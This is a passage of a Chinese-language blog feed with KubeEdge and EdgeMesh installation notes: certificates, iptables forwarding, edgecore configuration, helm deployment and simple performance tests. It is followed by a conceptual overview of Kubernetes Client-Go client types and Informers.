su</span><br><span class="line"><span class="built_in">export</span> CLOUDCOREIPS=<span class="string">&quot;192.168.43.118&quot;</span></span><br><span class="line">bash /etc/kubeedge/certgen.sh stream</span><br></pre></td></tr></table></figure><p>在master设置iptables规则，把所有发往边缘edgecore10350的包全部转发给cloudcore，让edgecore通过stream来转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 端口10003和10350是 CloudStream 和 Edgecore 的默认端口</span></span><br><span class="line">sudo iptables -t nat -A OUTPUT -p tcp --dport 10350 -j DNAT --to 10.0.1.200:10003</span><br></pre></td></tr></table></figure><p>修改边缘端edgecore配置文件 <code>/etc/kubeedge/config/edgecore.yaml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/kubeedge/config/edgecore.yaml</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">edgeStream:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 修改为true</span></span><br><span class="line">    <span class="attr">handshakeTimeout:</span> <span class="number">30</span></span><br><span class="line">    <span class="attr">readDeadline:</span> <span class="number">15</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">101.201</span><span class="number">.181</span><span class="number">.239</span><span class="string">:10004</span> <span class="comment"># 这个为cloudcore的ip地址</span></span><br><span class="line">    <span class="attr">tlsTunnelCAFile:</span> <span class="string">/etc/kubeedge/ca/rootCA.crt</span></span><br><span class="line">    <span class="attr">tlsTunnelCertFile:</span> <span class="string">/etc/kubeedge/certs/server.crt</span></span><br><span class="line">    <span class="attr">tlsTunnelPrivateKeyFile:</span> <span class="string">/etc/kubeedge/certs/server.key</span></span><br><span class="line">    <span class="attr">writeDeadline:</span> <span class="number">15</span></span><br></pre></td></tr></table></figure><p>重启edgecore</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart edgecore</span><br></pre></td></tr></table></figure><p>然后边缘的edgecore就可以正常启动了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start edgecore</span><br><span class="line">sudo systemctl status edgecore</span><br><span class="line">● edgecore.service</span><br><span class="line">     Loaded: loaded (/etc/systemd/system/edgecore.service; enabled; vendor preset: enabled)</span><br><span class="line">     Active: active (running) since Thu 2022-07-07 16:53:51 CST; 4s ago</span><br><span class="line">   Main PID: 58760 (edgecore)</span><br><span class="line">      Tasks: 10 (<span class="built_in">limit</span>: 992)</span><br><span class="line">     Memory: 36.5M</span><br><span class="line">        CPU: 315ms</span><br><span class="line">     CGroup: /system.slice/edgecore.service</span><br><span class="line">             └─58760 /usr/local/bin/edgecore</span><br></pre></td></tr></table></figure><p>现在就可以正常在云端看边缘的logs了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs nginx-597c67fd4d-hwmdz</span><br><span class="line">/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration</span><br><span class="line">/docker-entrypoint.sh: Looking <span class="keyword">for</span> shell scripts <span class="keyword">in</span> /docker-entrypoint.d/</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="安装EdgeMesh"><a href="#安装EdgeMesh" class="headerlink" title="安装EdgeMesh"></a>安装EdgeMesh</h2><p>在边缘不使用kube-proxy以后，边缘需要一个网络代理插件，这里我们使用kubeedge官方的edgemesh</p><p>EdgeMesh 相当于kube-proxy+flannel+coreDNS</p><p>edgemesh现在从kubeedge独立出来了，有自己专门的文档网站<a href="https://edgemesh.netlify.app/zh/">介绍 | EdgeMesh</a>，根据文档edgemesh是一个不依赖kubeedge的独立的k8s网络代理，只需要在master节点上使用helm安装就可以了</p><p>去除 K8s master 节点的污点，如果 K8s master 节点上没有部署需要被代理的应用，此步骤也可以不执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl taint nodes --all node-role.kubernetes.io/master-</span><br></pre></td></tr></table></figure><p>正常情况下你不会希望 EdgeMesh 去代理 Kubernetes API 服务，因此需要给它添加过滤标签，更多信息请参考 <a href="https://edgemesh.netlify.app/advanced/hybird-proxy.html#%E6%9C%8D%E5%8A%A1%E8%BF%87%E6%BB%A4">服务过滤</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label services kubernetes service.edgemesh.kubeedge.io/service-proxy-name=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>启用 KubeEdge 的边缘 Kube-API 端点服务</p><p>在云端，开启 dynamicController 模块，配置完成后，需要重启 cloudcore</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kubectl edit cm cloudcore -n kubeedge</span><br><span class="line">modules:</span><br><span class="line">  ...</span><br><span class="line">  dynamicController:</span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 杀死cloudcore容器</span></span><br><span class="line">kubectl get all -nkubeedge</span><br><span class="line">kubectl delete -nkubeedge pod/cloudcore-6687684d4d-92cvz</span><br></pre></td></tr></table></figure><p>在边缘节点，打开 metaServer 模块，配置完成后，需要重启 edgecore</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/kubeedge/config/edgecore.yaml</span><br><span class="line">modules:</span><br><span class="line">  ...</span><br><span class="line">  metaManager:</span><br><span class="line">    metaServer:</span><br><span class="line">      <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">...</span><br><span class="line"><span class="comment"># 重启 edgecore</span></span><br><span class="line">sudo systemctl restart edgecore</span><br></pre></td></tr></table></figure><p>在边缘节点，配置 clusterDNS 和 clusterDomain，配置完成后，需要重启 edgecore（这是为了边缘应用能够访问到 EdgeMesh 的 DNS 服务，与边缘 Kube-API 端点本身无关，但为了配置的流畅性，还是放在这里说明。</p><p>clusterDNS 设置的值 ‘169.254.96.16’ 来自于 <a href="https://edgemesh.netlify.app/zh/reference/config-items.html#edgemesh-agent-cfg">commonConfig</a> 中 bridgeDeviceIP 的默认值，正常情况下无需修改，非得修改请保持两者一致。）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/kubeedge/config/edgecore.yaml</span><br><span class="line">modules:</span><br><span class="line">  ...</span><br><span class="line">  edged:</span><br><span class="line">    ...</span><br><span class="line">    tailoredKubeletConfig:</span><br><span class="line">      ...</span><br><span class="line">      clusterDNS:</span><br><span class="line">      - 169.254.96.16</span><br><span class="line">      clusterDomain: cluster.local</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 重启 edgecore</span></span><br><span class="line">sudo systemctl restart edgecore</span><br></pre></td></tr></table></figure><p>最后，在边缘节点，测试边缘 Kube-API 端点功能是否正常</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1:10550/api/v1/services</span><br><span class="line"><span class="comment"># 出现apiversion开头的json字符串说明正常</span></span><br><span class="line">&#123;<span class="string">&quot;apiVersion&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;items&quot;</span>:[&#123;<span class="string">&quot;api......</span></span><br></pre></td></tr></table></figure><p>主机安装helm3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://get.helm.sh/helm-v3.11.0-linux-amd64.tar.gz</span><br><span class="line">tar -xf helm-v3.11.0-linux-amd64.tar.gz</span><br><span class="line">sudo <span class="built_in">mv</span> linux-amd64/helm /usr/local/bin/</span><br></pre></td></tr></table></figure><p>设置helm repo仓库，这里使用微软仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">helm repo add stable http://mirror.azure.cn/kubernetes/charts</span><br><span class="line">helm repo update</span><br></pre></td></tr></table></figure><p>生成PSK密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl rand -<span class="built_in">base64</span> 32</span><br><span class="line">JDhvPrqj/mA/2zA4P9voxqQIR8ectRzY8pDKaD+vlHo=</span><br></pre></td></tr></table></figure><p>helm安装edgemesh，只有一个master节点作为中继节点，暴露地址写云主机公网IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">helm install edgemesh --namespace kubeedge \</span><br><span class="line">--<span class="built_in">set</span> agent.psk=JDhvPrqj/mA/2zA4P9voxqQIR8ectRzY8pDKaD+vlHo= \</span><br><span class="line">--<span class="built_in">set</span> agent.relayNodes[0].nodeName=master,agent.relayNodes[0].advertiseAddress=<span class="string">&quot;&#123;192.168.80.128&#125;&quot;</span> \</span><br><span class="line">https://raw.githubusercontent.com/kubeedge/edgemesh/main/build/helm/edgemesh.tgz</span><br></pre></td></tr></table></figure><p>多个中继节点，如果一个边缘局域网内要做到服务可访问，应该在局域网内设置一个rely节点(似乎不用)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">helm install edgemesh --namespace kubeedge \</span><br><span class="line">--<span class="built_in">set</span> agent.psk=udj41ZTdaQNb0gUaS64QuLgkFNTYy9dlXKg6bvQYuls= \</span><br><span class="line">--<span class="built_in">set</span> agent.relayNodes[0].nodeName=master,agent.relayNodes[0].advertiseAddress=<span class="string">&quot;&#123;101.201.181.239&#125;&quot;</span> \</span><br><span class="line">--<span class="built_in">set</span> agent.relayNodes[1].nodeName=edgenode2,agent.relayNodes[1].advertiseAddress=<span class="string">&quot;&#123;192.168.56.11&#125;&quot;</span> \</span><br><span class="line">--<span class="built_in">set</span> agent.relayNodes[2].nodeName=edgenode3,agent.relayNodes[2].advertiseAddress=<span class="string">&quot;&#123;192.168.56.12&#125;&quot;</span> \</span><br><span class="line">https://raw.githubusercontent.com/kubeedge/edgemesh/main/build/helm/edgemesh.tgz</span><br></pre></td></tr></table></figure><p>卸载edgemesh方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">helm uninstall edgemesh -n kubeedge</span><br></pre></td></tr></table></figure><p>检验部署结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">helm <span class="built_in">ls</span> -A</span><br><span class="line">NAME            NAMESPACE       REVISION        UPDATED                                 STATUS          CHART              APP VERSION  </span><br><span class="line">edgemesh        kubeedge        1               2022-10-08 22:36:18.261721438 +0800 CST deployed        edgemesh-0.1.0     latest</span><br></pre></td></tr></table></figure><p>再次检验</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kubectl get all -n kubeedge -o wide</span><br><span class="line">NAME                             READY   STATUS              RESTARTS      AGE    IP              NODE          NOMINATED NODE   READINESS GATES</span><br><span class="line">pod/cloudcore-5768d46f8d-t8dnn   1/1     Running             1 (50m ago)   159m   172.28.40.134   master        &lt;none&gt;           &lt;none&gt;</span><br><span class="line">pod/edgemesh-agent-4f5xt         0/1     ContainerCreating   0             4m8s   192.168.40.10   area1-node1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">pod/edgemesh-agent-6czts         0/1     CrashLoopBackOff    5 (27s ago)   4m8s   172.28.40.134   master        &lt;none&gt;           &lt;none&gt;</span><br><span class="line">pod/edgemesh-agent-krvsc         0/1     Pending             0             4m8s   &lt;none&gt;          area2-node1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">pod/edgemesh-agent-p22b5         0/1     Pending             0             4m8s   &lt;none&gt;          area2-node2   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">pod/edgemesh-agent-tzq7g         0/1     Pending             0             4m8s   &lt;none&gt;          area1-node2   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>云主机上的edgemesh启动崩溃，边缘上的edgemesh一直在下载镜像，创建容器和pending，可以看看是不是edgemesh镜像不是最新的造成的</p><p>等了一晚上，终于edgemesh镜像拉取完毕，在边缘运行起来了。</p><p>因为helm部署的edgemesh在重启后不会恢复，因此我们手动部署edgemesh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/kubeedge/edgemesh.git</span><br><span class="line"><span class="built_in">cd</span> edgemesh</span><br><span class="line">kubectl apply -f build/crds/istio/</span><br><span class="line"><span class="comment"># 设置 build/agent/resources/04-configmap.yaml 的 relayNodes，并重新生成 PSK 密码</span></span><br><span class="line">kubectl apply -f build/agent/resources/</span><br><span class="line"><span class="comment"># 检验部署结果</span></span><br><span class="line">kubectl get all -n kubeedge -o wide</span><br></pre></td></tr></table></figure><h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><p>查看监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof -i -P -n | grep LISTEN</span><br><span class="line">sudo netstat -tulpn | grep LISTEN</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 云边流量</span></span><br><span class="line">ip.addr == 192.168.80.128</span><br><span class="line"><span class="comment"># 边边流量</span></span><br><span class="line">arp or mdns or ssdp or (ip.src == 192.168.0.0/24 and ip.dst == 192.168.0.0/24)</span><br></pre></td></tr></table></figure><h3 id="健康检查"><a href="#健康检查" class="headerlink" title="健康检查"></a>健康检查</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        res=$(curl http://10.96.0.28:8091/scheduler |grep 0.000)</span><br><span class="line">        <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$res</span>&quot;</span> ];<span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;得到正确的功率值&quot;</span></span><br><span class="line">                <span class="built_in">echo</span> -e <span class="string">&quot;\a&quot;</span></span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="built_in">sleep</span> 1</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">curl http://10.96.0.28:8091/scheduler</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行时用time运行脚本</span></span><br><span class="line">time ./test.sh</span><br></pre></td></tr></table></figure><h3 id="统计离线感知的准确度"><a href="#统计离线感知的准确度" class="headerlink" title="统计离线感知的准确度"></a>统计离线感知的准确度</h3><p>部署nginx应用，使每个应用均匀分布在每个节点上</p><p>断开一个运行有应用的节点的云边连接，查看控制平面上该节点上的Pod是否会迁移</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 禁止某个节点ip上外网</span></span><br><span class="line">sudo iptables -A FORWARD -i enp0s8 -s 192.168.56.10 -o enp0s3 -j DROP</span><br><span class="line"><span class="comment"># 恢复某个节点上外网</span></span><br><span class="line">sudo iptables -A FORWARD -i enp0s8 -s 192.168.56.10 -o enp0s3 -j ACCEPT</span><br><span class="line"><span class="comment"># 列出规则</span></span><br><span class="line">sudo iptables -L -n --line-number</span><br><span class="line"><span class="comment"># 删除规则</span></span><br><span class="line">sudo iptables -D FORWARD 1</span><br></pre></td></tr></table></figure><p>关闭一个运行有应用的节点电源，查看控制平面上该节点上的Pod是否会迁移</p><h3 id="重连同步性能"><a href="#重连同步性能" class="headerlink" title="重连同步性能"></a>重连同步性能</h3><p>边缘断网以后，等待节点not ready被打上污点，然后使用nethogs记录apiserver的流量情况，然后边缘通网，等节点ready后10秒结束流量记录，每秒流量总和即为重连同步的数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用nethogs工具查看apiserver进程网速</span></span><br><span class="line">sudo apt install nethogs</span><br><span class="line">nethogs -b|grep kube-apiserver &gt;mon.txt</span><br></pre></td></tr></table></figure><p>Ubuntu20.04 TLS 开机卡在“A start job is running for wait for network to be Configured”解决</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在[Service]下添加 TimeoutStartSec=2sec，（设置超时时间为2秒）如下：</span></span><br><span class="line">sudo vi /etc/systemd/system/network-online.target.wants/systemd-networkd-wait-online.service</span><br><span class="line">[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=/lib/systemd/systemd-networkd-wait-online</span><br><span class="line">RemainAfterExit=<span class="built_in">yes</span></span><br><span class="line">TimeoutStartSec=2sec</span><br></pre></td></tr></table></figure><p>修改pod上限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/kubeedge/config/edgecore.yaml <span class="comment"># kubeedge</span></span><br><span class="line">...</span><br><span class="line"><span class="comment"># 修改下行</span></span><br><span class="line">maxPods: 500</span><br><span class="line">sudo vi /var/lib/kubelet/config.yaml <span class="comment"># 其他</span></span><br><span class="line">...</span><br><span class="line"><span class="comment"># 加入下行</span></span><br><span class="line">maxPods: 500</span><br><span class="line">sudo systemctl restart kubelet </span><br><span class="line">sudo systemctl restart edgecore </span><br><span class="line"><span class="comment"># master查询状态：</span></span><br><span class="line">kubectl describe node node1  |  grep -i <span class="string">&quot;Capacity\|Allocatable&quot;</span> -A 6</span><br></pre></td></tr></table></figure><h2 id="安装Prometheuses"><a href="#安装Prometheuses" class="headerlink" title="安装Prometheuses"></a>安装Prometheuses</h2>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">-环境搭建</category>
      
      
      <comments>http://example.com/2023/12/02/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Client-Go笔记</title>
      <link>http://example.com/2023/10/18/Client-Go%E7%AC%94%E8%AE%B0/</link>
      <guid>http://example.com/2023/10/18/Client-Go%E7%AC%94%E8%AE%B0/</guid>
      <pubDate>Wed, 18 Oct 2023 11:33:59 GMT</pubDate>
      
      <description>Client-go是负责与Kubernetes APIServer服务进行交互的客户资源，利用Client-go与Kubernetes APIServer进行交互访问，以此来对Kubernetes中的各类资源对象进行管理操作，包括内置的资源对象及CRD。Client-Go不仅被Kubernetes项目本身使用，其它围绕着Kubernetes的生态，也被大量的使用，例如：kubectl，ETCD-operator等等。</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="Client-go简介"><a href="#Client-go简介" class="headerlink" title="Client-go简介"></a>Client-go简介</h2><p>Client-go是负责与Kubernetes APIServer服务进行交互的客户资源，利用Client-go与Kubernetes APIServer进行交互访问，以此来对Kubernetes中的各类资源对象进行管理操作，包括内置的资源对象及CRD。</p><p>Client-Go不仅被Kubernetes项目本身使用，其它围绕着Kubernetes的生态，也被大量的使用，例如：kubectl，ETCD-operator等等。</p><h2 id="Client-go客户端对象"><a href="#Client-go客户端对象" class="headerlink" title="Client-go客户端对象"></a>Client-go客户端对象</h2><p>Client-go共提供了4种与Kubernetes APIServer交互的客户端对象。分别是RESTClient、DiscoverClient、ClientSet、DynamicClient。</p><p>RESTClient：最基础的客户端，主要是对HTTP请求进行了封装，支持Json和Protobuf格式的数据。</p><p>DiscoveryClient：发现客户端。负责发现APIServer支持的资源组、资源版本和资源信息。</p><p>~#: kubectl api-resources</p><p>ClientSet：负责操作Kuernetes内置的资源对象。例如：Pod、Service等。</p><p>DynamicClient：动态客户端，可以对任意的Kubernetes资源进行通用操作，包括CRD。</p><h2 id="RESTClient"><a href="#RESTClient" class="headerlink" title="RESTClient"></a>RESTClient</h2><p>RESTClient是所有客户端的父类，他是最基础的客户端。</p><p>他提供了RESTful对应的方法的封装，如：GET()、Put()、Post()、Delete()等。通过这些封装的方法与Kubernetes APIServer进行交互。</p><p>因为它是所有客户端的父类，所以它可以操作kubernetes内置的所有资源对象以及CRD。</p><h3 id="准备需要："><a href="#准备需要：" class="headerlink" title="准备需要："></a>准备需要：</h3><p>1.k8s的配置文件</p><p>在 ~&#x2F;.kube&#x2F;config文件中</p><p>2.保证你的开发机能通过这个配置文件连接到k8s集群</p><h3 id="书写："><a href="#书写：" class="headerlink" title="书写："></a>书写：</h3><p>1.加载配置文件，生成config对象</p><p>1.加载</p><p>2.配置api路径</p><p>如：config.APIPath &#x3D; “api” &#x2F;&#x2F; pods, &#x2F;api&#x2F;v1&#x2F;pods</p><p>或 config.APIPath &#x3D; “api” &#x2F;&#x2F;developments, &#x2F;apis&#x2F;apps&#x2F;v1&#x2F;namespace&#x2F;{namespace}&#x2F;developments&#x2F;{development}</p><p>3.配置分配版本</p><p>需要pod，核心资源组</p><p>分无名和有名资源组</p><p>4.配置数据的编解码工具</p><p>5.实例化RESTClient对象</p><p>6.定义接受返回值的变量</p><p>7.与APIServer交互</p><p>GET请求方式</p><p>指定命名空间</p><p>指定需要查询的资源，传递资源名称</p><p>参数及参数的序列化工具</p><p>触发请求</p><p>写入返回结果</p><p>GET,定义请求方式，返回了一个Request结构体对象，这个Request结构体对象，就是构建访问APIServer请求用的，依次执行了Namespace，Resource，VersionedParams，构建与APIServer交互的参数。Do方法通过request发起请求，然后通过transformResponse解析请求返回，并绑定到对应资源对象的结构体对象上，同时，request方法先是检查了是否有可用的Client，在这里开始使用net&#x2F;http包的功能。</p><h2 id="ClientSet"><a href="#ClientSet" class="headerlink" title="ClientSet"></a>ClientSet</h2><p>相对上面更加优雅</p><p>ClientSet是基于RESTClient的封装，同时ClientSet是使用预生成的API对象与APIServer进行交互的，这样做更方便我们进行二次开发。</p><p>ClientSet是一组资源对象对客户端的集合，例如负责操作Pods、Service等资源的CoreV1Client等。通过这些资源对象客户端提供的操作方法，即可对Kubernetes内置的资源对象进行Create、Update、Get、List、Delete等操作。</p><h3 id="书写"><a href="#书写" class="headerlink" title="书写"></a>书写</h3><p>1.加载配置文件</p><p>2.实例化（相对之前省去很多过程）</p><p>ClientSet与API交互过程</p><p>返回CoreV1Client实例</p><p>指定查询的资源以及指定资源的namespace，namespace如果为空，则表示查询所有的namespace</p><p>查询pod列表</p><p>CoreV1返回了CoreV1Client实例对象</p><p>Pods调用了newPods函数，该函数返回的是PodInterface对象，PodInterface对象实现了Pods资源相关的全部方案，同时在newPods里面还将RESTclient实例对象赋值给了对应的Client属性。</p><p>List内使用RestClient与K8S APIServer进行了交互。</p><h2 id="DynamicClient（动态客户端）"><a href="#DynamicClient（动态客户端）" class="headerlink" title="DynamicClient（动态客户端）"></a>DynamicClient（动态客户端）</h2><p>DynamicClient是一种动态客户端，通过动态指定资源组、资源版本和资源等信息，来操作任意的Kubernetes资源对象的一种客户端，即不仅仅通过操作Kubernetes内置的资源对象还可以操作CRD这这也是与ClientSet最明显的一个区别。</p><p>使用ClientSet的时候，程序会将所用的版本与类型紧密耦合，而DynamicClient使用嵌套的map(string)interface{}结构存储Kubernetes APIServer的返回值，使用反射机制，在运行的时候，进行数据绑定，这种方式更加灵活，但是却无法获取强数据类型的检查和验证。</p><p>补充：</p><p>1.Object.runtime接口和Unstructed结构体。</p><p>Object.runtime：kubernetes中的所有资源对象，都实现了这个接口·，其中包含DeepCopyObject和GetObjectKind的方法，分别用于对象深拷贝和获取对象的具体资源类型。</p><p>Unstructed：包含map(string)interface{}类型字段，在处理无法预知结构的数据时，将数据值存入interface{}中，待运行时利用反射判断。该结构体提供了大量的工具方法，便于处理非结构化的数据。</p><h3 id="书写：-1"><a href="#书写：-1" class="headerlink" title="书写："></a>书写：</h3><p>1.加载配置文件生成config对象</p><p>2.实例化客户端对象，这里是实例化动态客户端对象</p><p>3.配置我们需要用的GVR</p><p>4.发送请求，且得到返回结果</p><p>三种客户端对象都是针对资源对象管理的。而DiscoverClient则是针对GVR的，用于查看当前Kubertnetes集群支持哪些资源组、资源版本、资源信息。</p><h2 id="将GVR数据缓存到本地"><a href="#将GVR数据缓存到本地" class="headerlink" title="将GVR数据缓存到本地"></a>将GVR数据缓存到本地</h2><p>GVR数据其实是很少·1变动的，因此我们可以将GVR数据缓存在本地，减少Client与APIServer交互，减少网络损耗。</p><p>在discoverery&#x2F;cached中，有另外两个客户端是来实现将GVR数据缓存到本地文件和内存中的，分别是CachedDiscoveryClient和memCacheClient。</p><p>其实，我们平时管理的k8s的集群的kubectl命令也是使用这样的方式来使用我们的GVR与APIServer交互的。它的缓存文件默认是在~&#x2F;.kube&#x2F;cache中的。</p><h2 id="Informer"><a href="#Informer" class="headerlink" title="Informer"></a>Informer</h2><p>Informer负责与Kubernetes APIServer进行Watch操作，Watch的资源，可以是Kubernetes内置资源对象，也可以是CRD。</p><p>Informer是一个带有本地缓存以及索引机制的核心工具包，当请求数据为查询操作时，会优先从本地缓存去查找数据，而创新、更新、删除，这类的操作则会根据事件通知写到deltaFIFO中，同时对对应的事件处理过后，更新本地缓存，使本地缓存与ETCD的数据保持一致。</p><p>Informer抽象出来的这个缓存器，将查询相关操作的压力接收下来，这样就不必每次都调用APIServer的接口，减轻了APIServer的数据交互压力。</p><p><img src="/2023/10/18/Client-Go%E7%AC%94%E8%AE%B0/informer.png"></p><h3 id="书写：-2"><a href="#书写：-2" class="headerlink" title="书写："></a>书写：</h3><p>1.加载配置文件，生成config对象</p><p>2.实例化Informer对象</p><p>3.定义接受返回值的变量</p><p>4.与APIServer交互</p><p>5.写入返回结果</p><h3 id="监听资源对象"><a href="#监听资源对象" class="headerlink" title="监听资源对象"></a>监听资源对象</h3><p>1.定义接受返回值的变量</p><p>2.与APIServer交互</p><p>3.写入返回结果</p><h2 id="书写控制器"><a href="#书写控制器" class="headerlink" title="书写控制器"></a>书写控制器</h2><p>replicaset controller</p><p>例子ReplivaSet控制器负责保证有desire number of pods来match所规定的selector</p><p>如果match selector的pod少于所预期，则增加pod</p><p>反之，减少pod</p>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2023/10/18/Client-Go%E7%AC%94%E8%AE%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
